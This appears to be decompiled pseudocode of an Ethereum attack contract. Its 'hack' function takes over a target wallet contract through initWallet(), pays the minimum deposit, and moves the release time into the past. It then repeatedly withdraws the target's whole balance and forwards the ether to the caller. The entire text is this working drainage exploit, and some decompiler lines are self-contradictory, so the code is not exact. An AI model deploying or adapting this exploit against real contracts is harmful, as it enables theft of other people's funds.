contract main {


// =======================  Init code  ======================


const _fallback = code.data[30 len 996]




// =====================  Runtime code  =====================


function _fallback() payable {
  stop
}

function withdraw() {
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
}

function hack(address arg1) payable {
    require ext_code.size(arg1)
    call arg1.initWallet() with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require ext_code.size(arg1)
    call arg1.MinimumDeposit() with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require msg.value > ext_call.return_data[0]
    require ext_code.size(arg1)
    call arg1.deposit() with:
       value msg.value wei
         gas gas_remaining - 9710 wei
    require ext_call.success
    require ext_code.size(arg1)
    call arg1.setRelease(uint256 rg1) with:
         gas gas_remaining - 710 wei
        args (block.timestamp - 900)
    require ext_call.success
    s = 0
    while eth.balance(arg1) > ext_call.return_data[0]:
        mem[96] = 0xf3fef3a300000000000000000000000000000000000000000000000000000000
        mem[100] = this.address
        mem[132] = ext_call.return_data[0]
        require ext_code.size(arg1)
        call arg1.withdraw(address rg1, uint256 rg2) with:
             gas gas_remaining - 710 wei
            args address(this.address), ext_call.return_data[0]
        require ext_call.success
        require eth.balance(arg1) < eth.balance(arg1)
        s = eth.balance(arg1)
        continue 
    if eth.balance(arg1) > 0:
        require ext_code.size(arg1)
        call arg1.withdraw(address rg1, uint256 rg2) with:
             gas gas_remaining - 710 wei
            args address(this.address), eth.balance(arg1)
        require ext_call.success
    require eth.balance(this.address) > eth.balance(this.address)
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
}



}
